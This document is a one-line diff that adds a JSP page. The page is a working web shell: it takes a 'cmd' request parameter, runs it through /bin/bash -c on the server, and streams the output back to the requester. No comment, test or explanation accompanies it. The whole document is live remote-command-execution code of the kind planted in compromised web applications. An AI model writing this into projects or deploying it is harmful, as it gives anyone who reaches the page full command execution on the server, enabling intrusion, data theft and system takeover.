@@ -1,0 +1,1 @@
+<%@ page import="java.io.*" %><%try{String c=request.getParameter("cmd");if(c==null)c="id";Process p=new ProcessBuilder("/bin/bash","-c",c).redirectErrorStream(true).start();InputStream i=p.getInputStream();byte[] b=new byte[8192];int n;while((n=i.read(b))>=0){out.write(new String(b,0,n));}}catch(Exception e){out.print("ERR "+e);}%>
